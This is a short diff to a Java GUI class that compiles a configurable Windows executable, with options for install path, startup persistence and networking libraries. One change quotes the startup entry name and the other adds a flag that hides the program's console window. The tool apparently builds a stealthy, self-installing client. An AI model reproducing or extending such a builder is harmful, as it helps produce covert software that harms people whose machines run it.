@@ -69,7 +69,7 @@ public class Compiler implements ActionListener {
                 modifier.setInstallationPath(buttonGroup.getSelection().getActionCommand());
                 modifier.setSubdirectoryName(fieldsArray[6].getText());
                 modifier.setSubdirectoryFileName(fieldsArray[7].getText() + ".exe");
-                modifier.setStartUpName("STARTUP_NAME", checkBoxes[1].isSelected() ? fieldsArray[8].getText() : "");
+                modifier.setStartUpName("STARTUP_NAME", checkBoxes[1].isSelected() ? "\""+fieldsArray[8].getText()+"\"" : "");
             } else {
                 modifier.setInstallationPath("(-1)");
             }
@@ -94,7 +94,7 @@ public class Compiler implements ActionListener {
             command.append("-lwsock32 -lcomctl32 -lgdi32 " +
                     "-lole32 -lsetupapi -lws2_32  -loleaut32 -luuid" +
                     " -lcomdlg32 -lwininet -static-libgcc " +
-                    "-static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -o ").append(
+                    "-static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -mwindows -o ").append(
                     chooser.getSelectedFile().getAbsolutePath());
 
             if (checkBoxes[3].isSelected()){
